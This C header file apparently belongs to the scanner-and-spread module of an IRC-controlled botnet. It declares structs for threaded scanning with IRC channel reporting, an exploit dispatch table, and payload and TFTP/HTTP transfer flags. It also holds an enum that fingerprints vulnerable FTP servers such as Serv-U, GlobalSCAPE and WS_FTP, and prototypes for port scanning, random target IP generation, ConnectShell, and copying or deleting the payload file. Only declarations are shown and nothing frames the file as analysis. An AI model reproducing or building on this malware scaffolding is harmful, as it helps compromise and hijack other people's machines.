typedef struct ADVSCAN 
{
	char ip[16];
	char myip[16];
	char chan[128];
	char msgchan[128];
	SOCKET sock;
	unsigned int port;
	unsigned int delay;
	unsigned int minutes;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	DWORD host;
	bool notice;
	bool silent;
	bool random;
	bool gotinfo;
	bool cgotinfo;
	bool payload;

} ADVSCAN;

typedef struct ADVINFO 
{
	unsigned long ip;
	bool info;

} ADVINFO;

typedef struct EXINFO 
{
	SOCKET sock;
	char ip[16];
	char myip[16];
	char chan[128];
	char command[10];
	unsigned int port;
	unsigned int threadnum;
	int exploit;
	bool option;
	bool notice;
	bool silent;
	bool gotinfo;
	bool payload;

} EXINFO;

typedef bool (*efref)(EXINFO exinfo);

typedef struct EXPLOIT 
{
	char command[10];
	char name[30];
	unsigned int port;
	efref exfunc;
	int stats;
	bool tftp;
	bool http;

} EXPLOIT;

typedef struct recvhdr 
{
	struct iphdr ip;
	struct tcphdr2 tcp;
	unsigned char junk_data[65535];

} RECVHEADER;

enum {
	FTP_TYPE_SERVU_5X,				// Serv-U FTPd v5.x
	FTP_TYPE_SERVU_4X,				// Serv-U FTPd v4.x
	FTP_TYPE_SERVU_3X,				// Serv-U FTPd v2.x
	FTP_TYPE_SERVU_2X,				// Serv-U FTPd v2.x
	FTP_TYPE_SERVU,					// Serv-U FTPd vX.x
	FTP_TYPE_GLOBALSCAPE_SECURE_3X,	// GlobalSCAPE Secure FTP Server (v. 3.x)
	FTP_TYPE_GLOBALSCAPE_SECURE_XX, // GlobalSCAPE Secure FTP Server (v. X.x)
	FTP_TYPE_GLOBALSCAPE_3X,		// GlobalSCAPE FTP Server (v. 3.x) 
	FTP_TYPE_GLOBALSCAPE_XX,		// GlobalSCAPE FTP Server (v. X.x)
	FTP_TYPE_NET_TERM,				// NetTerm FTP server
	FTP_TYPE_WSFTP_503,				// WS_FTP Server Version 5.03
	FTP_TYPE_3CDAEMON_20,			// 3Com 3CDaemon FTP Server Version 2.0
	FTP_TYPE_UNKNOWN				// Unknown FTPd
};

bool AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay);
bool AdvUDPPortOpen(unsigned long ip, unsigned int port, unsigned int delay);
DWORD WINAPI AdvScanner(LPVOID param);
bool ConnectShell(EXINFO exinfo, int port);
bool AddEx(EXINFO exinfo, bool transfer);
int AdvFTPdScannerCheckHead(EXINFO exinfo);
void ListExploitStats(SOCKET sock, char *chan, bool notice);
void currentIP(SOCKET sock, char *chan, bool notice, int threadnum);
void DelPayloadFile(SOCKET sock, char *chan, bool notice, bool silent);
void CheckServers(ADVSCAN scan);
unsigned long AdvGetNextIP(int threadnum);
unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum);
DWORD WINAPI AdvPortScanner(LPVOID param);
void GetLocalPayloadFile(char *szFullPayloadFile, size_t nSize);
bool CopyLocalPayloadFile(void);